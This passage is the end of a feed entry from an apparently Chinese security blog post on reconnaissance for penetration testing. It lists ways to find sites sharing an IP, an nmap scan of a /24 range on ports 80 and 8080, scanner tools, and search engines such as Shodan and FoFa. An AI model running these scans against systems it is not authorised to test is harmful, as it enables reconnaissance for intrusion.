rel="noopener">http://cn.bing.com/search?q=ip:111.111.111.111</a><br>（2）站长之家：<a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a><br>（3）利用Google，语法：site:125.125.125.*<br>（4）利用Nmap，语法：nmap -p 80,8080 –open ip/24<br>（5）K8工具、御剑、北极熊扫描器等<br>（6）在线：<a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a><br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/9.png" alt="9"></p><p>最后，附上几个常用的搜索引擎：<br>ZoomEy：<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a><br>FoFa：<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a><br>Dnsdb：<a href="https://www.dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://www.dnsdb.io/zh-cn/</a><br>Shodam：<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a><br>Censys：<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a><br>御剑全家桶：<a href="http://www.moonsec.com/post-753.html" target="_blank" rel="noopener">http://www.moonsec.com/post-753.html</a>   </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;信息收集是指通过各种方式获取所需要的信息，以便我们在后续的渗透过程更好的进行。最简单的比如说目标站点的IP、中间件、脚本语言、端口、邮箱等等。我觉得信息收集在我们渗透测试的过程当中，是最重要的一环，这一环节没做好，没收集到足够多的可利用的信息，我们很难进行下一步的操作。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="信息收集" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
</feed>
